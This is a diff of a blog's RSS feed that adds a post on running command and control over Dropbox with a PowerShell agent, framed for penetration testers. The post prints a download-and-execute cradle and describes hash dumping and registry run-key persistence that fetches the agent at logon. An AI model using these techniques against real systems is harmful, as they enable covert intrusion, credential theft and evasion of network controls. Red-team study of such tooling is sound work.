@@ -6,8 +6,121 @@
     <description>Recent content on Truneski</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 21 Dec 2016 10:08:30 +0100</lastBuildDate>
+    <lastBuildDate>Fri, 03 Mar 2017 07:02:14 +0100</lastBuildDate>
     <atom:link href="https://truneski.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>dropbox c2 over powershell</title>
+      <link>https://truneski.github.io/blog/2017/03/03/dropbox-c2-over-powershell/</link>
+      <pubDate>Fri, 03 Mar 2017 07:02:14 +0100</pubDate>
+      
+      <guid>https://truneski.github.io/blog/2017/03/03/dropbox-c2-over-powershell/</guid>
+      <description>
+
+&lt;p&gt;Consider a scenario where a Pentester is trying to set up command and control on an internal network blocking all outbound traffic,
+except traffic towards a few specific servers or 3rd party applications the tester has to. In this situation,
+there are still a few options a tester can use. One of those is DNS command and control and the other is Command and control
+over file sharing sites such as Dropbox and Google docs. In this article we will explore how dropbox can be used for
+such operations and more.&lt;/p&gt;
+
+&lt;p&gt;In case you&amp;rsquo;re unfamiliar with this concept, it involves using DropBox as a platform for command and control
+since dropbox is a legitimate website for storing files and documents. This concept makes it incredibly hard for users
+to immediately suspect and report malicious  activities on their systems, therefore making C2 over DropBox highly effective.&lt;/p&gt;
+
+&lt;p&gt;DropBox-C2(DBC2) by &lt;a href=&#34;https://twitter.com/arno0x0x&#34;&gt;@Arno0x0x&lt;/a&gt; is the best example I&amp;rsquo;ve come across for such a working example. It supports running commands,
+shellMode for a more interactive feel, launching processes, Persistence, Data Exfiltration and running Custom Powershell modules.
+The last feature I was really excited about because it gives testers many possibilities incliding running their own
+custom Powershell scripts. The agent is written in C-Sharp and the server is wriiten in Python.&lt;/p&gt;
+
+&lt;p&gt;After a week and a half, I managed to implement some features of the DBC2 agent in a Powershell client available here.
+I have been teaching myself Powershell over the last month and thought I&amp;rsquo;d take on this challenge to further
+my knowledge of Powershell since its quite common among real world attackers , penetration testers and APTs.
+This is due to its versatility, many features and that its inbuilt in Windows systems.
+In this blogpost we&amp;rsquo;ll look at how DBC2-Powershell script can be used.&lt;/p&gt;
+
+&lt;h1 id=&#34;setup&#34;&gt;Setup&lt;/h1&gt;
+
+&lt;p&gt;You can read how to setup and use the original &lt;a href=&#34;https://github.com/Arno0x/DBC2&#34;&gt;DBC2&lt;/a&gt;, its a fantastic resource
+and I highly recommend it. Once you&amp;rsquo;ve setup the server and its ready, you can start it like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;python dropboxc2.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The server will then ask for your DropBox Access token and master password to encryp all data between agent and server controller.
+A windows machine with Powershell version 5.0 is required. The DBC2 script can be loaded by downloading the script and running it as shown:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;. .\DropBox.ps1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Alternatively you can host it on your own server or github page and use a download cradle as shown:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#39;&amp;lt;insert server name or github page/DropBox.ps1&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once the script is loaded run the following command to start the DBC2 Powershell Agent:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Dropbox
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Invoke-DropBox is the name of the Main function used in DBC2-Powershell. After its executed it will create two files on your
+dropbox account. A status file and a command file each with a unique identifier based on each machine it&amp;rsquo;s run own.&lt;/p&gt;
+
+&lt;h1 id=&#34;executing-native-commands&#34;&gt;Executing Native Commands&lt;/h1&gt;
+
+&lt;p&gt;From the server you can direct the client to perform and run various commands.
+Here&amp;rsquo;s a video of what that looks like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;video1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;launching-processes&#34;&gt;Launching Processes&lt;/h1&gt;
+
+&lt;p&gt;From the server side you can have the agent launch processes. In this case we&amp;rsquo;ll be launching notepad and chrome.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;video2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;file-transfers&#34;&gt;File Transfers&lt;/h1&gt;
+
+&lt;p&gt;The script can transfer files from the controller to the server and vice versa.
+The short video shows how to send a file from the controller to the agent:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;video 3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;using-powershell-modules&#34;&gt;Using Powershell Modules&lt;/h1&gt;
+
+&lt;p&gt;DBC2-Powershell Agent has the ability to run custom Powershell and return the output to the server.
+It still has a few kinks which I am currently working to fix but for now can execute the scripts
+and return output just fine. In the video below we will use PowerDump to dump local password hashes
+from the local system. Here&amp;rsquo;s a video of what that looks like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;video 4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;persistence&#34;&gt;Persistence&lt;/h1&gt;
+
+&lt;p&gt;Unlike the original DBC2 agent which relid on scheduled tasks with a a malicious bat file for persistence,
+DBC2-Powershell uses a malicious registry runkey for persistence which downloads and executes our published agent
+whenever a user logs on. The video below shows how the persistnce technique works:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;video 5
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;future-work&#34;&gt;Future Work&lt;/h1&gt;
+
+&lt;p&gt;There is still alot to do in this project. There are some features I&amp;rsquo;m yrt to inplement which are working well
+in the original DBC2 and they include fixing the shellmode which is functional but not yet ready to be fully demo&amp;rsquo;d, changing the polling time, setting the sleep time, better output from the cutsom PS modules, Obfuscation and Encryption. I really struggled with the encryption part but couldn&amp;rsquo;t make it work.
+It&amp;rsquo;s definetely on the to-do list :). I&amp;rsquo;ll be devoting a few hours a week so that I can finally complete it. Any help is welcome.&lt;/p&gt;
+
+&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;Command and control over DropBox has awesome practical advantages. If you doubt the power of such a technique you only need to read the
+awesome report by Cyber-X code named &lt;a href=&#34;https://cyberx-labs.com/en/blog/operation-bugdrop-cyberx-discovers-large-scale-cyber-reconnaissance-operation/&#34;&gt;Operation BugDrop&lt;/a&gt;
+That report only fueled me more to release an early version even if incomplete.
+Pentesters can now use DBC2-Powershell alongside the usual familiar and common powershell tools.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Markdown Cheatsheet</title>
